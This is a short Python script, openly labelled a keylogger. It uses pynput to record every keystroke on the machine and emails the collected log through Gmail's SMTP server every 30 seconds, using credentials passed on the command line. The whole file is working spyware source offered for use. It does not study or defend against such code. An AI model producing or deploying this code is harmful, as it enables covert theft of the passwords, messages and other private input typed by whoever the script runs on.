import pynput.keyboard
import smtplib
import threading
import argparse

log = ""

def callback_function(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += str(key)

    print(log)

def send_email(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()

def thread_function(email, password):
    global log
    send_email(email, password, log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(30, thread_function, args=(email, password))
    timer_object.start()

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description="Python keylogger with email functionality")
    parser.add_argument("-e", "--email", required=True, help="Email address for sending the logs")
    parser.add_argument("-p", "--password", required=True, help="Password for the email account")

    args = parser.parse_args()

    keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

    # threading
    with keylogger_listener:
        thread_function(args.email, args.password)
        keylogger_listener.join()
